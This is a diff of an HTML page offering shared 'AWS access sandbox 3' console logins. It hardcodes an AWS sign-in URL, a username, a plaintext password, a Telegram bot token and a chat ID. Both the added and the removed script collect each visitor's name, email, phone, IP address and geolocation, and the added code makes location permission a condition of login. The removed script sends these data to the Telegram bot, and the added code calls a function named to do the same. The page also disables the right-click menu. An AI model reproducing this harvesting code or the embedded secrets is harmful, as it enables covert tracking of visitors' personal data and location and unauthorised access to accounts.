+            return typeof phone === "string" && /^\+91[0-9]{10}$/.test(phone);
+          }
+          // If login card is visible, enforce first!
+          if (loginCard && loginCard.style.display !== "none") {
+            document.getElementById("submitBtn").click();
+            return;
+          }
+          // Extra guard if someone bypasses the login = ensure details are present:
+          if (!name || name.length < 2 || !email || !validateEmail(email) || !phone || !validatePhone(phone)) {
+            alert("Please fill all details before opening sandbox.\nPhone number must start with +91 and be followed by exactly 10 digits.");
+            return;
+          }
+
+          // Only open if credentials are visible right now
+          var sandboxURL = document.getElementById('sandboxURL');
+          if (sandboxURL && sandboxURL.value) {
+            window.open(sandboxURL.value, '_blank');
+          } else {
+            alert("The credentials are only available from 12:50PM to 7:15PM.\nPlease try during the allowed time.");
+          }
+        });
+
+        // Login form logic
+        (function() {
+          const loginCard = document.getElementById("loginCard");
+          const welcomeSection = document.getElementById("welcomeSection");
+          const msg = document.getElementById("msg");
+          document.getElementById("submitBtn").addEventListener("click", submitForm);
+          function validateEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+          }
+          function validatePhone(phone) {
+            return typeof phone === "string" && /^\+91[0-9]{10}$/.test(phone);
+          }
+          function getSignupTimeString() {
+            const d = new Date();
+            const pad = n => n.toString().padStart(2, '0');
+            return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
+          }
+          function submitForm(e) {
+            if (window.getSelection) { window.getSelection().removeAllRanges(); }
+            if (getLocationPermissionStatus() !== "allowed") {
+              messageAllowLocationInChrome();
+              return;
+            }
+            const name = document.getElementById('name').value.trim();
+            const email = document.getElementById('email').value.trim();
+            let phone = document.getElementById('phone').value.trim();
+            phone = phone.replace(/[^0-9+]/g, '');
+            if (!phone.startsWith("+91")) {
+              phone = "+91" + phone.replace(/^(\+)?(91)?/, "");
+            }
+            if (phone.length > 13) {
+              phone = phone.slice(0, 13);
+              document.getElementById('phone').value = phone;
+            }
+            msg.style.display = "block";
+            msg.style.background = "";
+            msg.style.color = "var(--accent)";
+            if (name.length < 2) {
+              msg.textContent = "Enter valid name";
+              msg.style.background = "#cc3333";
+              msg.style.color = "#fff";
+              return;
+            }
+            if (!validateEmail(email)) {
+              msg.textContent = "Enter valid email";
+              msg.style.background = "#cc3333";
+              msg.style.color = "#fff";
+              return;
+            }
+            if (!validatePhone(phone)) {
+              msg.textContent = "Enter valid phone (+91XXXXXXXXXX)";
+              msg.style.background = "#cc3333";
+              msg.style.color = "#fff";
+              return;
+            }
+            let geoObj = undefined;
+            let uLat = sessionStorage.getItem("locationUserLat");
+            let uLon = sessionStorage.getItem("locationUserLon");
+            let uAcc = sessionStorage.getItem("locationUserAcc");
+            if (uLat && uLon && uAcc) {
+              geoObj = {
+                latitude: Number(uLat),
+                longitude: Number(uLon),
+                accuracy: Number(uAcc)
+              };
+            }
+            const signupTime = getSignupTimeString();
+            let ipAddr = undefined;
+            function sendTelegramWhenReady() {
+              sendLoginLocAndIpToTelegram(name, email, phone, signupTime, geoObj, ipAddr);
+            }
+            fetch("https://api.ipify.org?format=json")
+              .then(resp => resp.json())
+              .then(data => {
+                ipAddr = data.ip;
+                sendTelegramWhenReady();
+              })
+              .catch(() => {
+                ipAddr = undefined;
+                sendTelegramWhenReady();
+              });
+            msg.style.background = "#226622";
+            msg.style.color = "#fff";
+            msg.textContent = "Access Granted!";
+            setTimeout(() => {
+              msg.style.display = "none";
+              loginCard.style.display = "none";
+              welcomeSection.style.display = "block";
+            }, 1000);
+          }
+        })();
       }).catch(function() {
         // Location checks failed, page replaced.
       });
     });
   </script>
-</head>
-<body oncontextmenu="return false" style="background: none!important;">
-  <div class="animated-blur-bg" id="dynamicBg"></div>
-  <div id="signupContainer">
-    <div class="signup-title">
-      <img src="https://sepiasolutions.com/images/aws-banner-secondery-image.png" alt="AWS Banner" style="max-width:170px;vertical-align:middle;margin-bottom:5px;display:block;margin-left:auto;margin-right:auto;">
-      AWS access sandbox 3 <br>
-      <span class="sandbox-time-black"> </span>
-    </div>
-    <form id="signupForm" autocomplete="off">
-      <div class="input-row">
-        <span class="input-icon">👤</span>
-        <input type="text" id="name" class="form-input" placeholder="Your Name" autocomplete="name" required>
-      </div>
-      <div class="input-row">
-        <span class="input-icon">📧</span>
-        <input type="email" id="email" class="form-input" placeholder="Your Email" autocomplete="email" required>
-      </div>
-      <div class="input-row">
-        <span class="input-icon">📱</span>
-        <input
-          type="tel"
-          id="phone"
-          class="form-input"
-          placeholder="Your Phone (e.g. +91XXXXXXXXXX)"
-          autocomplete="tel"
-          pattern="^(?:\+91[\-\s]?)?[6-9]\d{9}$"
-          maxlength="14"
-          required
-          oninput="
-            // Remove any non-digit except + at the beginning
-            this.value = this.value.replace(/[^\d+]/g, function(m, i) {
-              return (i === 0 && m === '+') ? '+' : '';
-            });
-            // Prevent input longer than 13 chars (+91 and 10 digits)
-            if(this.value.startsWith('+91') && this.value.length > 13) this.value = this.value.slice(0,13);
-            else if(!this.value.startsWith('+91') && this.value.length > 10) this.value = this.value.slice(0,10);
-          "
-          title="Please enter a valid Indian mobile number with or without +91.">
-      </div>
-      <script>
-        // Block Spam Numbers like 1234567890, 1111111111 etc. on submit
-        document.getElementById('signupForm').addEventListener('submit', function(e) {
-          var phone = document.getElementById('phone').value.replace(/\D/g, '');
-          // Remove country code if present
-          if (phone.length === 12 && phone.startsWith('91')) phone = phone.slice(2);
-          // Check for length and obvious patterns (spam)
-          if (
-            phone.length !== 10 ||
-            /^([0-9])\1+$/.test(phone) ||                // 1111111111, 0000000000
-            phone === "1234567890" || phone === "0123456789" || phone === "9876543210"
-          ) {
-            alert("Please enter a valid (non-spam) Indian mobile number.");
-            e.preventDefault();
-            document.getElementById('phone').focus();
-          }
-        });
-      </script>
-      <button type="submit" class="styled-btn" id="submitBtn">
-        <span id="btnText">Submit</span>
-        <span id="spinner" style="display:none;vertical-align:middle;">&nbsp;
-          <svg width="20" height="20" viewBox="0 0 50 50">
-            <circle cx="25" cy="25" r="20" fill="none" stroke="#1ee3b0" stroke-width="6" stroke-linecap="round" stroke-dasharray="31.4 31.4" stroke-dashoffset="0" transform="rotate(-90 25 25)">
-              <animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.95s" repeatCount="indefinite" />
-            </circle>
-          </svg>
-        </span>
-      </button>
-    </form>
-    <div class="message" id="message"></div>
-    <div class="signup-info" id="signupInfo"></div>
-  </div>
- <div class="sandbox-card" id="sandboxCard">
-    <h2>Welcome, <span id="userNamePlaceholder">User</span>!</h2>
-    <div class="sandbox-row-group">
-      <label for="sb-url" class="sb-label">AWS Console:</label>
-      <div class="sb-in-row">
-        <input id="sb-url" class="sb-inp" value="https://890247063306.signin.aws.amazon.com/console?region=us-east-1" readonly>
-        <button type="button" class="copy-btn" onclick="copyToClipboard('sb-url', this)">Copy</button>
-      </div>
-    </div>
-    <div class="auto-shutdown-row" id="autoShutdownRow">
-      <span>Auto Shutdown at <span id="autoShutdownTime">--:--</span></span>
-      <br>
-      <small>Your sandbox will be shut down and cleaned at this time.</small>
-    </div>
-    <div class="sandbox-row-group">
-      <label for="sb-username" class="sb-label">Username:</label>
-      <div class="sb-in-row">
-        <input id="sb-username" class="sb-inp" value="cloud_user" readonly>
-        <button type="button" class="copy-btn" onclick="copyToClipboard('sb-username', this)">Copy</button>
-      </div>
-    </div>
-    <div class="sandbox-row-group" style="margin-bottom: 5px;">
-      <label for="sb-password" class="sb-label">Password:</label>
-      <div class="sb-in-row">
-        <input id="sb-password" class="sb-inp" value="6uz3IPjDmu)Rz9A=6(A[" readonly>
-        <button type="button" class="copy-btn" onclick="copyToClipboard('sb-password', this)">Copy</button>
-      </div>
-    </div>
-    <button type="button" class="return-btn" onclick="returnToSignup()">⬅️ Back</button>
-  </div>
-
-  <script>
-    // Dynamic glass blur background accent effect
-    function getRandomDarkPastelColor() {
-      var h = Math.floor(Math.random() * 360);
-      return 'hsla(' + h + ',74%,19%,0.73)';
-    }
-    function setAnimatedBlurBg() {
-      const bg = document.getElementById('dynamicBg');
-      const g =
-        "radial-gradient(circle at 45% 33%, "+getRandomDarkPastelColor()+" 0%,transparent 34%),"+
-        "radial-gradient(circle at 62% 77%, "+getRandomDarkPastelColor()+" 0%,transparent 50%),"+
-        "radial-gradient(circle at 80% 48%, "+getRandomDarkPastelColor()+" 0%,transparent 36%),"+
-        "radial-gradient(circle at 12% 75%, "+getRandomDarkPastelColor()+" 0%,transparent 55%)";
-      bg.style.background = g;
-    }
-    setAnimatedBlurBg();
-    setInterval(setAnimatedBlurBg, 10000);
-
-    // Signup logic with all corrections
-    const TELEGRAM_BOT_TOKEN = '7878047212:AAFtWO7f6Ws2sYHqHSviasJUOy7cO11lZ4o';
-    const TELEGRAM_CHAT_ID = '5025112538';
-
-    let userIP = '';
-    let userAddress = '';
-
-    // Helper to fetch user IP and assign to userIP variable
-    async function fetchUserIPData() {
-      try {
-        const ipResp = await fetch('https://api.ipify.org?format=json');
-        if (ipResp.ok) {
-          const ipData = await ipResp.json();
-          userIP = ipData.ip || 'unknown';
-        } else {
-          userIP = 'unknown';
-        }
-      } catch (e) {
-        userIP = 'unknown';
-      }
-    }
-
-    // Helper to fetch address using geolocation and assign to userAddress variable
-    async function fetchUserLocation() {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-          userAddress = '';
-          resolve();
-        } else {
-          navigator.geolocation.getCurrentPosition(async function(position) {
-            const { latitude, longitude } = position.coords;
-            try {
-              const resp = await fetch(
-                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=10&addressdetails=1`
-              );
-              if (resp.ok) {
-                const data = await resp.json();
-                let addrArr = [];
-                if (data.address.city) addrArr.push(data.address.city);
-                if (data.address.state) addrArr.push(data.address.state);
-                if (data.address.country) addrArr.push(data.address.country);
-                userAddress = addrArr.length ? addrArr.join(', ') : '';
-              } else {
-                userAddress = '';
-              }
-            } catch (e) {
-              userAddress = '';
-            }
-            resolve();
-          }, function() {
-            userAddress = '';
-            resolve();
-          });
-        }
-      });
-    }
-
-    // On load, fetch both IP and (if available) address
-    async function setUserLocationAndIP() {
-      await fetchUserLocation();
-      await fetchUserIPData();
-    }
-    // Call on load
-    setUserLocationAndIP();
-
-    function setAutoShutdownTime() {
-      const el = document.getElementById('autoShutdownTime');
-      if (!el) return;
-      let now = new Date();
-      let shutdown = new Date(now);
-      shutdown.setSeconds(0); shutdown.setMilliseconds(0);
-
-      // Set to 7:00 AM today or next day if past 7:00 AM
-      const targetToday = new Date(now);
-      targetToday.setHours(7, 0, 0, 0); // 7:00 AM today
-
-      if (now < targetToday) {
-        shutdown = targetToday;
-      } else {
-        shutdown = new Date(now);
-        shutdown.setDate(now.getDate() + 1);
-        shutdown.setHours(7, 0, 0, 0);
-      }
-
-      let h = String(shutdown.getHours()).padStart(2, '0');
-      let m = String(shutdown.getMinutes()).padStart(2, '0');
-      let t = `${h}:${m}`;
-      el.textContent = t;
-    }
-    setAutoShutdownTime();
-
-    function showMessage(msg, type) {
-      const box = document.getElementById("message");
-      box.textContent = msg;
-      box.classList.remove("success", "error");
-      if (type === "success") box.classList.add("success");
-      if (type === "error") box.classList.add("error");
-      if (msg) box.style.display = "block";
-      else box.style.display = "none";
-    }
-    function showInfo(msg) {
-      const info = document.getElementById('signupInfo');
-      info.style.display = msg ? "block" : "none";
-      info.textContent = msg || "";
-    }
-
-    async function sendToTelegram(name, email, phone, timestr, ip, address) {
-      let text = `📩 AWS-3:\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nSignup Time: ${timestr}`;
-      if (ip || address) {
-        text += `\nIP: ${ip || 'unknown'}`;
-        if (address) text += `\nLocation: ${address}`;
-      }
-      return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
-      });
-    }
-
-    function setBtnLoading(loading) {
-      document.getElementById('btnText').style.display = loading ? 'none' : '';
-      document.getElementById('spinner').style.display = loading ? '' : 'none';
-    }
-
-    document.getElementById('signupForm').addEventListener('submit', async function (e) {
-      e.preventDefault();
-      showMessage(""); showInfo("");
-      setBtnLoading(true);
-
-      const name = document.getElementById('name').value.trim();
-      const email = document.getElementById('email').value.trim();
-      const phone = document.getElementById('phone').value.trim();
-
-      if (!/^[a-zA-Z\s]{2,}$/.test(name)) {
-        showMessage("Please enter a valid name.", 'error'); setBtnLoading(false); return;
-      }
-      if (!/^\S+@\S+\.\S+$/.test(email)) {
-        showMessage("Please enter a valid email address.", 'error'); setBtnLoading(false); return;
-      }
-      if (phone.replace(/\D/g, "").length < 8) {
-        showMessage("Please enter a valid phone number.", 'error'); setBtnLoading(false); return;
-      }
-
-      // Make sure IP info is fetched before sending message
-      if (!userIP) {
-        await fetchUserIPData();
-      }
-
-      const now = new Date();
-      const dateStr = now.toLocaleDateString();
-      const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-      const signupTime = `${dateStr} ${timeStr}`;
-
-      try {
-        const response = await sendToTelegram(
-          name, email, phone, signupTime, userIP, userAddress
-        );
-        if (response && response.ok) {
-          showMessage("✅ Sent successfully!", "success");
-          showInfo(`Thank you, ${name}! You signed up at ${signupTime}.`);
-          document.getElementById('signupForm').reset();
-
-          setTimeout(() => {
-            document.getElementById('signupContainer').style.display = 'none';
-            document.getElementById('sandboxCard').style.display = 'block';
-            setAutoShutdownTime();
-            document.getElementById('userNamePlaceholder').textContent = name;
-          }, 1100);
-        } else {
-          showMessage("❌ Failed to send.", "error");
-          showInfo('');
-        }
-      } catch (err) {
-        showMessage("⚠️ Error occurred.", "error");
-        showInfo('');
-      }
-      setBtnLoading(false);
-    });
-
-    function copyToClipboard(inputId, btn) {
-      const inp = document.getElementById(inputId);
-      inp.select && inp.select();
-      inp.setSelectionRange && inp.setSelectionRange(0, inp.value.length);
-      navigator.clipboard.writeText(inp.value).then(function () {
-        const old = btn.textContent;
-        btn.textContent = "✓ Copied!";
-        btn.disabled = true;
-        setTimeout(function () { btn.textContent = old; btn.disabled = false; }, 950);
-      });
-    }
-
-    function returnToSignup() {
-      document.getElementById('signupForm').reset();
-      document.getElementById('signupContainer').style.display = 'block';
-      document.getElementById('sandboxCard').style.display = 'none';
-      showMessage("");
-      showInfo("");
-    }
-  </script>
 </body>
-
 </html>
-
-
-
